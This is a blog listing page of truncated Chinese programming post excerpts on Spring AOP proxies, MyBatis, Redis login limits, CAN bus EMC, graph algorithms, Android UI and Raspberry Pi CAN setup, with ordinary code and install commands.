			<a href="/posts/b3cc23253da4b7d71c422adba7199baa/" rel="bookmark">
			Spring代理同一个方法调用同一个对象中的兄弟方法的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		service有A、B两个方法，A方法无AOP，B方法有AOP。在A方法中调用了B方法。
问题1：B方法AOP会不会生效？为什么？问题2：如果不会，怎么解决？ 涉及的知识点：事务传播特性，嵌套事务
同一个方法调用同一个对象中的兄弟方法，基于JDK接口形式的动态代理，是不会生效的。
但是，基于cglib形式的动态代理，那就不一定了。
Spring的配置可以让你去选择使用哪种动态代理。
JDK动态代理基于接口，要生成代理类，是通过实现了一个接口生成的，但是代理类实现了相通的接口，他的实现从何而来，必须从一个目标对象target身上来，target作为方法调用的基础，然后在target前后左右做拦截。对于spring aop来说，我们平时加上@transactional注解的service类，实际上，就是target的类，我们在service方法内部调用另外一个兄弟service方法，实际上，就是target内部的调用，并没有走外层的拦截。
但是，cglib形式的动态代理，是基于继承的，代理类是继承一个目标类而来，这样，代理类还需要一个target吗？其实是不需要的， 因为在代理类的实例中，已经包含了一个父类对象super，我们只需要覆盖父类的方法，在super的前后左右做拦截，就可以完成动态代理。
但是，cglib继承模式中，也可以持有一个target属性，而忽略super，只是说，我们多了一个选择，可以不选择target，使用super，也可以使用一个target，而不使用super。
对于spring aop中的cglib形式动态代理来说，我们只是在service类上加了transactional注解，根本就不存在任何的target，因此，在spring aop中，cglib形式下的动态代理就是基于super的拦截。
好了，既然是基于super的拦截，cglib也是采用继承覆盖父类方法实现的，那么，在service类中，调用一个兄弟方法的时候，出现了一个很奇特的现象：那就是，你在service类中调用一个兄弟方法，就一定是调用super对象中的另一个兄弟方法吗？
因为子类已经覆盖了父类的方法，你在调用一个兄弟方法的时候，实际上，因为多态的存在，调用的是你的子类（代理类）的覆盖后的方法，而子类（代理类）的方法，是已经实现了拦截的方法。所以，这个时候，@transactional注解，是会生效的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b19292deecb956fe926725ba6c36399/" rel="bookmark">
			mybatis 批量删除数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 mybatis批量删除数据，将需要删除的数据id存放到list中，将list作为参数传递，具体代码如下:
1、在mapper层中创建deleteAudioAudioFiles(@Param(“ids”)List ids) 方法，返回删除的数据条数 package com.center.manager.mapper; import java.util.List; import org.apache.ibatis.annotations.Mapper; import org.apache.ibatis.annotations.Param; import com.center.manager.bean.Audio; @Mapper public interface AudioMapper { int deleteAudioAudioFiles(@Param("ids")List&lt;String&gt; ids); //批量删除数据 } 2、mybatis的xml文件中的delete语句如下: &lt;?xml version="1.0" encoding="UTF-8" ?&gt; &lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd" &gt; &lt;mapper namespace="com.center.manager.mapper.AudioMapper"&gt; &lt;delete id="deleteAudioAudioFiles"&gt; delete from t_audio where audio_file in &lt;foreach collection="ids" item="id" open="(" separator="," close=")"&gt; #{id,jdbcType=VARCHAR} &lt;/foreach&gt; &lt;/delete&gt; &lt;/mapper&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77b0e9a10a2d730ba249a0669bdc0a67/" rel="bookmark">
			Redis实现同一账号登录个数限制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景：
最近接到一个需求，为了方便用户使用，系统的同一个用户账号可以在5个浏览器是登录，第六个登录的把第一个挤掉，而且用户登录后长时间不操作是需要自动过期的，也就是说需要有session过期时间；
一、分析 从需求来看，用户被强制下线有两种可能，一个是session过期，二个是被后面登录的挤掉；第6个登录的把第1个登录的挤掉，那么我们就需要统计登录个数以及找到最早登录的信息；这么一想就联想到了Redis，可以使用Redis的String和ZSet数据结构来实现；
String存储的作用：session过期，需要重新登录；
ZSet存储的作用：后面登录的挤掉最先登录的；
ZSet具有排序的功能；用户登录后就是一个会话，就会产生一个session，不同的session不同的sessionid，所以：
一、使用sessionID作为key,userName作为value并且设置过期时间存储到redis的String类型的数据结构里；
二、然后把userName作为key，sessionID作为value，存储到ZSet类型的数据结构里，使用系统时间作为分数，设置过期时间；这样，ZSet就会根据时间进行排序，每次登录都先根据userName统计一次ZSet中存储的的个数，如果大于等于5，就删除最早存储的一个。（set里面，更新一个value 剩下的四个value过期时间也都更新，所以，只要同一个账号在过期时间之前登录，set的过期时间就刷新了，可以说，只要string里面存储的sessionId不过期，对应的set就不过期）
登录时通过redis的zcart方法判断ZSet中username对应的登录数量，如果大于等于5就清除最早登录的一组数据，然后把当前登录的信息存储到redis中。否则，直接存储到redis当中即可。
1、ZSet数据存储结构
2、ZString数据存储结构
二、实现 第一步：实现操作String和ZSet的方法 连接redis这里就不写了，可以使用JedisCluster，也可以使用spring-data-redis针对jedis提供的一个高度封装的“RedisTemplate”类（简单方便），这里使用的是JedisCluster，为了方便操作，这里写了两个操作工具类：
1. String数据结构操作工具类 package com.zhh.redis.util; import org.apache.log4j.Logger; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Component; import redis.clients.jedis.JedisCluster; /** * Redis 操作工具类 ：String数据结构 * @author zhaoheng * 2018-06-27 */ @Component public class RedisJpaTemplateString { private static final Logger log = Logger.getLogger(RedisJpaTemplateString.class.getName()); @Autowired private JedisCluster jedisCluster; /** * 默认过期时间 （单位：秒） */ private int expireTime = 24*60*60; /** * 用于隔开缓存前缀与缓存键值 */ private static final String KEY_SPLIT = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77b0e9a10a2d730ba249a0669bdc0a67/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2bc84b2e0c23152827973c4b06440a6/" rel="bookmark">
			CAN接口电路的 EMC设计方案（工业）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CAN接口电路的 EMC设计方案
CAN总线采用差分信号传输，通常情况下只需要两根信号线（CAN-H和CAN-L）就可以进行正常的通信。在干扰比较强的场合，还需要用到屏蔽地即CAN-G（主要功能是屏蔽干扰信号），CAN协议推荐用户使用屏蔽双绞线作为CAN总线的传输线。
在应用的过程中，通讯电缆容易耦合外部的干扰对信号传输产生影响；
单板内部的干扰也可能通过电缆形式对外辐射。
测试项目包括：辐射发射 传导发射 磁场抗扰度 传导抗扰度 静电抗扰度。
CAN接口电路 : CAN 接口电平 差分：
有信号“显”：CANH 3.5V CANL 1.5V 无信号时“隐”：CANH2.5V CANL2.5V
在“隐性”状态下，CAN-H与CAN-L的输入差分电压为0V（最大不超过0.5V），共模输入电压为2.5V。 逻辑1
在“显性”状态下，CAN-H与CAN-L的输入差分电压为2V（最小不小于0.9V），如下图 1所示。 逻辑0
本方案可通过汽车电子标准CISPR 25-2008及ISO7637系列标准，或可通过以下测试项目：
序号
接口测试项目
测试等级
性能判据
1
辐射发射(RE)
CISPR25 LV5
2
传导发射（CE）
CISPR25 LV5
3
射频磁场抗扰度(RI)
400~4000MHz 150V/m
驻留时间 2s
性能判据A
4
大电流注入
BCI
1~400MHz 150mA
150mm 驻留时间 2s
性能判据A
5
传导抗扰度7637-2
（24V系统）
波形1：Us=-450V 10000 pulses
波形2a：Us=+50V 10000 pulses
波形2b：Us=+20V 20 pulses
波形2a：Us=-150V 1h
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2bc84b2e0c23152827973c4b06440a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d3bc4c119af884e83f2278dd96f0c92/" rel="bookmark">
			基于networkx分析Louvain算法的社团网络划分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图论之-Python NetworkX 入门 1：图论概述 1.1图论基本概念 1图 一个图G = （V, E）由一些点及点之间的连线（称为边）构成，V、E分别计G的点集合和边集合。在图的概念中，点的空间位置，边的区直长短都无关紧要，重要的是其中有几个点以及那些点之间有变相连。
图1：图示例
2有向图和无向图 最基本的图通常被定义为“无向图”，与之对应的则被称为“有向图”。两者唯一的区别在于，有向图中的边是有方向性的。
图2：有向图和无向图
注：上图左边为无向图，右边为有向图。黑色加粗部分表示边的方向。比如：1—&gt;2便是边是1到2这个方向。
3图的度 度是相对于图中点的概念，图中任意一点v的度是指：与v相连的边的条数。在有向图中与顶点v出关联的边的数目称为出度，与顶点v入关联的边的数目称为入度。比如上图2：左边无向图顶点2的度是3.右边有向图点点2的出度是2，入度是1.
4图的连通性 在图G中，若顶点u，v之间有路（即找到有u到v之间相连的边）则称u，v连通。若G的任何两点之间有路，则称G是连通图。G的极大连通子图称为连通分支。如果连通图是有向图则称G是强连通的。
5图的最短路径 在图上任取两顶点，分别作为起点和终点，我们可以规划许多条由起点到终点的路线。不会来来回回绕圈子、不会重复经过同一个点和同一条边的路线，就是一条“路径”，这些路径中经过顶点最少的那个路径就是最短路径。
6图的简单路径 如果路径上的各顶点均不互相重复，称这样的路径为简单路径。如果路径上的第一个顶点与最后一个顶点重合，这样的路径称为回路(cycle)或环或圈。比如下图中：（1，2，3，4，5，1），（1，2，3，1），（1，3，4，5，1）等都是简单路径。
图3：简单路径
7图的偏心距（eccentricity） 一个节点的偏心距就是这个节点到其他节点的所有节点的最短路径的最大值。
8图的直径和半径 图的所有节点偏心距的最大值就是图的直径，最小值就是半径。
9图的紧密中心性(closeness) 在图论中，紧密度是图中一个节点的中心性度量。比其他节点更“浅”（也就是说，有更短的测地距离）的节点有更高的紧密度。在网络分析中，紧密度倾向于表示最短路径长度，因为这样会有更多的中心节点赋予更高的值，而且通常与其他度量（比如：度）相联系。紧密度是中心性的一种复杂度量。它被定义为节点v到其它可达节点的平均测地距离（比如：最短路径）：
其中当n&gt;=2是从v出发在网络中连通部分V的大小。接近中心性需要考量每个结点到其它结点的最短路的平均长度。也就是说，对于一个结点而言，它距离其它结点越近，那么它的中心度越高。一般来说，那种需要让尽可能多的人使用的设施，它的接近中心度一般是比较高的。
10图的介数中心性(Betweenness Centrality) 对于n各节点的图G=(V, E)，节点v的介数CB(v)按如下方式计算：
对于每对节点(s, t)，计算他们之间所有的最短路径；对于每对节点(s, t)，通过判断(here, 节点v)求出它在最短路径上的部分；对每对节点(s, t)求出的部分进行累加 公式表示为：
其中：σst是s到t的最短路径数，σst()是s到t的最短路径中经过v的数量。它可以除以不包括节点v的节点数量（对于无向图是(n-1)(n-2)/2有向图是(n-1)(n-2)类归一化。）中介中心性指的是一个结点担任其它两个结点之间最短路的桥梁的次数。一个结点充当“中介”的次数越高，它的中介中心度就越大。
11图的度中心性 度中心性（Degree Centrality）是在网络分析中刻画节点中心性（Centrality）的最直接度量指标。一个节点的节点度越大就意味着这个节点的度中心性越高，该节点在网络中就越重要。
1.2图论基本算法 1图遍历之BFS算法（广度优先搜索） 算法步骤：
首先选择一个顶点作为起始节点，并将其染成灰色，其余结点为白色。 将起始结点放入队列中。从队列首部选出一个顶点，并找出所有与之邻接的结点，将找到的邻接结点放入队列尾部，将已访问过结点涂成黑色，没访问过的结点是白色。如果顶点的颜色是灰色，表示已经发现并且放入了队列，如果顶点的颜色是白色，表示还没有发现 。按照同样的方法处理队列中的下一个结点。 例如：下图
图：BFS搜索
从上图节点1开始搜索，染成灰色，其余白色。此时队列中只有节点{1}搜索1的邻居节点2， 3，此时1出队染成黑色表示已经访问，23入队{2， 3}搜索2的邻居节点3， 4，节点3已经在队列所以2出队染成黑色添加4进入队列{3， 4}搜索3的邻居节点2，4，节点2已经变黑表示已经访问，节点3出队变成黑色4此时就在队列{4}搜索4的邻居节点1，节点1已变成黑色。所以4出队变成黑色。队列为空。此时1， 2， 3， 4， 都已经变成黑色。还剩节点5，再从5开始搜索，结束。 2图遍历之DFS算法（深度优先搜索） 算法步骤：
选择起始顶点涂成灰色，表示还未访问；从该顶点的邻接顶点中选择一个，继续这个过程（即再寻找邻接结点的邻接结点），一直深入下去，直到一个顶点没有邻接结点了，涂黑它，表示访问过了；回溯到这个涂黑顶点的上一层顶点，再找这个上一层顶点的其余邻接结点，继续如上操作，如果所有邻接结点往下都访问过了，就把自己涂黑，再回溯到更上一层；上一层继续做如上操作，知道所有顶点都访问过。 实例：用下图作为说明
图：DFS搜索
从节点1开始依次访问1à2à 3之后终止于节点3；从节点3回溯到节点2，从2à5终止于节点5；从节点5回溯到2终止于2；从节点2回溯到1并终止于1；从顶点4开始访问终止于4. 3Python实现BFS和DFS（基于无向图）。 class Mygraph(object):
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d3bc4c119af884e83f2278dd96f0c92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10efbbc54c0f7eea696d175166e4fe5d/" rel="bookmark">
			判断一个URL是否可以正常访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		判断一个url是否可以访问，主要用于双域名问题 $.ajax({ url: 'www.xxx.xx', type: 'GET', complete: function(response) { if(response.status == 200) { location.href = 'http://xxx.xxx.xxx'; } else { location.href = 'http://xxx.xxx.xxx'; } } }); complete与success区别 //可以是单参，如上面 complete: function (XMLHttpRequest, textStatus) { //textStatus的值：success,notmodified,nocontent,error,timeout,abort,parsererror }, error: function (XMLHttpRequest, textStatus, errorThrown) { //textStatus的值：null, timeout, error, abort, parsererror //errorThrown的值：收到http出错文本，如 Not Found 或 Internal Server Error. } success ： 当请求成功时调用的函数。这个函数会得到一个参数：从服务器返回的数据。当请求成功时调用函数，即status==200。 complete ：当请求完成时调用的函数。这个函数会得到两个参数：XMLHttpRequest对象和一个描述请求成功的类型的字符串。当请求完成时调用函数，即status==404、403、302...。 ## 状态码 ## 100-继续。 101-切换协议。 2xx-成功 这类状态代码表明服务器成功地接受了客户端请求。 200-确定。客户端请求已成功。 201-已创建。 202-已接受。 203-非权威性信息。 204-无内容。 205-重置内容。 206-部分内容。 3xx-重定向 客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。 301-对象已永久移走，即永久重定向。 302-对象已临时移动。 304-未修改。 307-临时重定向。 4xx-客户端错误 发生错误，客户端似乎有问题。例如，客户端请求不存在的页面，客户端未提供有效的身份验证信息。400-错误的请求。 401-访问被拒绝。IIS定义了许多不同的401错误，它们指明更为具体的错误原因。这些具体的错误代码在浏览器中显示，但不在IIS日志中显示： 401.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10efbbc54c0f7eea696d175166e4fe5d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27bc3a91f0b0f729719b7d2073f48de6/" rel="bookmark">
			6. Z字形变换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		将字符串 "PAYPALISHIRING" 以Z字形排列成给定的行数：
P A H N A P L S I I G Y I R 之后从左往右，逐行读取字符："PAHNAPLSIIGYIR"
实现一个将字符串进行指定行数变换的函数:
string convert(string s, int numRows); 示例 1:
输入: s = "PAYPALISHIRING", numRows = 3 输出: "PAHNAPLSIIGYIR" 示例 2:
输入: s = "PAYPALISHIRING", numRows = 4 输出: "PINALSIGYAHRPI" 解释: P I N A L S I G Y A H R P I public class Solution { public string Convert(string s, int numRows) { if (numRows == 1 || s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27bc3a91f0b0f729719b7d2073f48de6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0195e4ea0356dcb238c64aab275a686d/" rel="bookmark">
			select multipleSelect多选框选中状态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js:
$().ready(function() {
var type=$("#setList").val(); $('#feeCyfkxm option').each(function () { if (type.indexOf(''+this.value+'')!=-1)this.selected=true;
});
});
&lt;label class="col-sm-3 control-label"&gt;冲预收款项目：&lt;/label&gt;
&lt;div class="col-sm-3"&gt;
&lt;input type="hidden" th:value="${setLists}" id="setLists"&gt;
&lt;input type="hidden" th:value="${set.feeCyfkxm}" id="setList"&gt;
&lt;input type="hidden" th:value="${feeCyfkxmList}" id="feeCyfkxmList"&gt;
&lt;select id="feeCyfkxm" name="feeCyfkxm" lay-verify="required" class="form-control " multiple="multiple"&gt; &lt;option th:each="hall : ${setList}" th:value="${hall.id}" th:text="${hall.feeName }" &gt;&lt;/option&gt;
&lt;/select&gt; &lt;/div&gt;
Java
//判读 冲抵项目的id集合
List&lt;SetDO&gt; feeCyfkxmList=new ArrayList&lt;SetDO&gt;();
String s=set.getFeeCyfkxm();
StringBuffer names=new StringBuffer();
if(s==""||s==null){ }else{
String[] ss=s.split(","); if(ss.length&gt;0){
for(String ids:ss){
SetDO se = setService.get(Integer.parseInt(ids)); feeCyfkxmList.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0195e4ea0356dcb238c64aab275a686d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a29b7b6c34337db1d3685b30e745a5cf/" rel="bookmark">
			Android   9宫格横向左右滑动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目中大多都会有很多的分类，且左右滑动，如美团首页（下图）：
不难发现包含2部分内容：1.左右滑动的页面，2.指示器。
大度一般都会想到，viewPager+GridView，这里介绍另外的的一种方法，也做下记录；
GridViewPager+MagicIndicator(万能指示器) 一，引入build.gradle compile 'com.yhy:gvp:1.1.0' compile 'com.github.hackware1993:MagicIndicator:1.5.0' 如果报错,在项目build.gradle中加入：
repositories { ... maven { url "https://jitpack.io" } } 二，布局代码
&lt;LinearLayout android:gravity="center_horizontal" android:layout_gravity="center_horizontal" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical"&gt; &lt;com.yhy.gvp.widget.GridViewPager android:paddingLeft="15dp" android:paddingRight="15dp" android:id="@+id/grid_viewpager" android:layout_width="match_parent" android:layout_height="150dp" app:num_columns="5" app:page_size="10"&gt;&lt;/com.yhy.gvp.widget.GridViewPager&gt; &lt;net.lucode.hackware.magicindicator.MagicIndicator android:id="@+id/indicator_container" android:layout_width="wrap_content" android:layout_height="30dp"&gt; &lt;/net.lucode.hackware.magicindicator.MagicIndicator&gt; &lt;/LinearLayout&gt; 属性说明：
属性名默认值属性说明page_size4每页显示数量num_columns4每页显示列 三，关键代码：
@InjectView(R.id.grid_viewpager) GridViewPager gridViewpager; @InjectView(R.id.indicator_container) MagicIndicator indicatorContainer; 使用ButterKnife这里不多介绍 indexTypeAdapter=new IndexTypeAdapter(getActivity(),R.layout.item_index_type,typeDatas);//页面内容适配器 gridViewpager.setGVPAdapter(indexTypeAdapter); Log.i("datas",(int) Math.ceil(typeDatas.size() / 10)+""); CommonNavigator commonNavigator = new CommonNavigator(context);//指示器 commonNavigator.setAdapter(new CommonNavigatorAdapter() { @Override public int getCount() { int num=typeDatas.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a29b7b6c34337db1d3685b30e745a5cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfcb40b256f6913413d8a527d9e086f8/" rel="bookmark">
			树莓派ubuntu mate16.04配置实现SPI转CAN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		树莓派ubuntu mate16.04配置实现SPI转CAN 硬件 RaspberryPi 3b RS485 CAN HAT树莓派扩展模块，mcp2515 CAN分析仪
系统 ubuntu mate16.04 desktop
安装必备库 WiringPi 的安装 WiringPi 官网下载： https://projects.drogon.net/raspberry-pi/wiringpi/download-and-install/ 复制安装包到你自己的镜像的系统中，把文件解压后,进入 WiringPi 文件夹内部，执行：
chmod 777 build ./build 安装完后输入： gpio -v查看是否安装完成 bcm2835 C 函数库的安装 bcm2835 官网下载：http://www.airspayce.com/mikem/bcm2835/ 复制文件解压后,进入 bcm2835-1.36 文件夹内部，执行： ./configure make sudo make check sudo make install python 函数库的安装 通过apt-get命令安装树莓派的python函数库（包括RPi.GPIO安装包和spidev安装包）链接如下，点进去左上命令复制安装即可 https://pypi.python.org/pypi/RPi.GPIO https://pypi.python.org/pypi/spidev
pip install RPi.GPIO pip install spidev 安装python-dev sudo apt-get install python-dev 安装smbus库，I2C接口库函数 sudo apt-get install python-smbus 安装serial库，UART接口库函数 sudo apt-get install python-serial 安装Can-utils库
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfcb40b256f6913413d8a527d9e086f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/618aa025113691333790ed3ec16d2584/" rel="bookmark">
			数据结构-字典
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		往往不做集合的并、交、差运算，而经常需要判定某个元素是否在给定集合中，并且对集合作插入、删除操作。
把字典定义为名字-属性对的组合，根据问题的不同，可以为名字和属性赋予不同的意义。
典型的字典组织方式有线性表、跳表、散列表
字典的抽象数据类型：
const int DefaultSize=26 template &lt;class Name,class Attribute&gt; Class Dictionary{ //对象：一组名字属性对，其中名字是唯一的 public: Dictionary(int size=DefaultSize); bool Member(Name name); Attribute *search(Name name); void Insert(Name name,Attribute attr); void Remove(Name name); } 用有序链表表示字典 链表中的每个结点表示字典的一个元素，各个结点按照结点中保存的关键码kl非递减链接，搜索一般不要搜索整个表
关键码可重复，搜索和删除操作只会操作遇到的第一个结点
在有n个结点的有序链表中，搜索、插入、删除操作的时间复杂度均为O(n)
#include &lt;iostream&gt; #include &lt;assert.h&gt; using namespace std; //E是元素的数据类型，它也是一个类，有自己的一些属性，其中包括K。K则是关键码的数据类型，在跳表中也用类定义 template &lt;class E,class K&gt; struct ChainNode { E data; ChainNode&lt;E, K&gt; *link; ChainNode():link(NULL){}; ChainNode(E &amp;el, ChainNode&lt;E, K&gt; *next = NULL):data(el),link(next){}; }; template &lt;class E,class K&gt; class SortedChain{ public: SortedChain(){ first=new ChainNode&lt;E,K&gt;; assert(first!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/618aa025113691333790ed3ec16d2584/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e32ca832b739b974ad83bbe2ebc43a8/" rel="bookmark">
			[转载] 图像处理入门教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章来源https://blog.csdn.net/u013088062/article/details/50425018
图像处理研究工具
图像处理的研究分为算法研究和应用两个部分。用到的主要编程语言有Matlab、C/C++、Python等，原因很简单，它们都有很多相应的第三方库，不用我们从零开始编程。
1、Matlab
MathWork公司的Matlab软件可以说是算法研究的利器，它的强大之处在于其方便快捷的矩阵运算能力和图形仿真能力，单从简洁性和封装性来说，确实完爆其他语言。但高度封装必然会相应的损失一部分灵活性，况且Matlab严格的讲更像是一个工具，而非一门编程语言。顺便提一句，它在2015年编程语言排行榜中位于第20名，仅次于IOS开发的Objective-C。
对于算法研究人员（尤其是高校的硕士博士），首选工具自然是matlab，因为它简便快捷，封装性好，更重要的是全世界几乎所有的算法大牛、精英教授都会首先公布对应的Matlab源码，然后在逐步改写成其他语言进行实际应用。所以，如果你想做图像处理方面的研究，Matlab是必须掌握的，而且是熟练掌握。当你有一些想法需要验证时，最好明智的先用matlab编写出来测试。如果你上来就用看似高大上的C++来实验，不仅错误BUG一大堆，到头来可能效果还不佳，就算效果好，时间也会耽搁不少，毕竟算法开发还是要快的，这样才能赶在别人之前发论文。总之，只要是接触图像算法，终究逃不过Matlab，就算你是软件开发的，不研发算法，但总得能看懂别人的Matlab算法吧。
对于之前没怎么接触过Matlab与图像处理的人，在这里推荐一本相关的书籍《MATLAB图像处理实例详解（附光盘）》。这本书对于Matlab图像处理入门还是很有帮助的。记得我当时刚上研究生时就靠两本书入门的，一是冈萨雷斯的《数字图像处理》，二是这本《MATLAB图像处理实例详解》。不过这里友情提示，在看这类教程（不仅仅是Matlab）时千万不要试图去记忆所有的工具函数，这种做法是十分愚蠢的。正确的做法是根据自己的情况快速翻阅这类工具书，可以找出里面的有实际意义的源码来敲一敲练练手感，至于具体的工具函数，只需要知道Matlab提供了这方面的功能就行了，以后用到了再回来查，或者谷歌百度。我觉得在入门阶段，最重要的不是看了多少书，听了多少课，而是尽快自己敲出一段代码，运行出结果，来建立自信和成就感，这才是支持我们走下去的最实在的动力。记得我当时看了没多久就自己敲了一个蹩脚的车牌检测的Matlab程序，现在看来真是漏洞百出，不过当时我真的很兴奋，很有成就感，觉得自己能干这行，对于初学者来说，这种感受弥足珍贵。
2、OpenCV
Opencv是Intel公司开发的C++图像处理工具包，形象的理解为就是C++版的Matlab。当初Intel公司开发这个工具包的初衷也是方便大家共享，希望大家能够在一个共同架构的基础上共同建造摩天大楼，而不是各自在自己的地基上盖平房。与Matlab不同，Opencv是面向开发的，稳定性好，异常处理机制周全，但有一点需要注意，由于Opencv是开源的，那么如果你在项目中直接调用了它的API，那就意味着你的项目也必须开源。因此在真正的产品开发过程中，往往需要从Opencv库里面挖代码，而不是直接调用，幸好Intel公司允许我们看源码，自己编译一把就可以了。
说道C++和Opencv，有一个问题不得不提，那就是深度学习领域大名鼎鼎的Caffe框架。这是一个典型的基于C++和OpenCv的深度学习框架，由谷歌深度学习团队、“谷歌大脑”负责人之一贾扬清学者编写，并公布了源码。如今各个深度学习机构都在大量使用这个框架进行研究。
这里同样对推荐两本关于Opencv方面的教程。一本是CSDN博客大牛毛星云写的《OpenCV3编程入门》，这是它根据自己多年的博客整理成的书，很详细，很典型的一本教程，介绍了OpenCv中相对前沿的知识。我翻看过这本教程，中规中矩，里面的代码通俗易懂，尤其适合初学者。当然大家同样要注意不要犯了死读书的毛病，只看它的功能，敲代码练手感即可，不要试图记忆API函数。重要的工具用多了自然会记住，不重要的工具记住了也没用。
这里推荐的第二本书是《图像识别与项目实践――VC++、MATLAB技术实现》，这本书是一本偏向于工程应用的书，我之所以推荐它是因为它给出了很多有新意、能运行的代码。其中里面有一个项目让我印象很深，是一个车牌检测的实例。简单描述一下：由于车牌中的字符数是固定的，因此它通过判断横向区域笔画的跳变数以及笔画宽度来定位车牌区域。这个想法让人耳目一新，并且它还给出了详细代码，我也亲身试验过，效果还不错。
这里同样再强调一下，就是一定要尽早入手写程序，建立自信和成就感。我当时学OpenCv正好用它开发了一个人脸性别识别的系统，是一个本科大学生创新计划的需求，效果还可以。
3、Python
Python在今年12月份的编程语言排行榜中名列第5，增长迅速。可以说Python已经逐渐成为当下脚本语言的新标准。Python在图像处理算法方面除了其自身简洁的编程优势外，还得益于两个重要的Python类库——Numpy和Theano。
Numpy是Python的线性代数库，对于矩阵运算能提供很好的支持，并且能够在此基础上进行很多机器学习相关算法的开发仿真，这里推荐一本受到大家广泛认可的书《机器学习实战》，我最近也正在看这本书，里面对好多机器学习领域的经典算法，小到KNN，大到SVM，都给出了详细的介绍以及代码实现（Python版）。Theano是Python的机器学习库，能够方便的实现深度学习（例如卷积神经网络CNN）算法，网上很多对于DeepID算法的复现都是用的这个库。
人觉得单从图像处理的角度评价的话，Python并没有前面两个工具（Matlab和OpenCv）应用广泛，不过作为通用的脚本语言，我觉得每个程序员都应该去了解了解它，毕竟俗话说没有烂的编程语言，只有烂程序员。我在学Python时第一个自己写的程序就是微信打飞机的小程序，在我的博客中有详细的教程，虽然是参照小甲鱼的《零基础入门学习Python》视频教程写的，但还是蛮有成就感的。
图像处理研究方法
我觉得，图像处理研究主要可以分为三个部分：基础概念、基本思想、算法研究。
1、基础概念
所谓基础概念，就是图像处理里最基本的知识，比如什么是图像？什么是像素？什么是彩色图像等等。没有一个明确的界限来划定什么是基础概念什么是高级知识，因人而异。了解图像处理的基础知识，有一本书是必读的，就是冈萨雷斯编写的、阮秋琦翻译的《数字图像处理》。这本书已经作为图像处理领域的经典教材使用了三十多年，我自己也把这本书看了好几遍，每一遍都会有新的体会。我觉得每一个搞图像的都应该熟读这本书。书中除了有几章内容在讲小波变换、模式识别等相对抽象的内容外，其他内容相对都是很基础的，本科生水平就能看懂。而且我建议要尽早看这本书，如果是研究生尽量在进入课题之前就看一遍，因为这样一本经典的书在进入课题之后可能就没时间看了，以后也顶多是查阅而已。我当初就是在大四的寒假看完了这本书，以后在图像入门的过程中就显得轻松很多。看完这本书，哪怕是只看前几章，明白了什么是图像（二维或者三维矩阵）、什么是像素、彩色图和灰度图、颜色空间、图像滤波、图像噪声、图像频域变换等概念，将来在进行更深一步的研究的话就会方便很多了。
2、基本思想
刚开始想把这部分内容命名为“基本算法”，意在介绍图像处理中的一些基本算法，后来仔细想想决定不这么写，因为图像处理是一个非常大的概念，图像处理不等于人脸识别，也不等于模式识别，直接介绍诸如图像处理基本算法之类的内容很容易写成空话，没有什么实际意义。读者有兴趣的话可以直接谷歌百度“图像处理十大经典算法”，上面有我想说的内容。
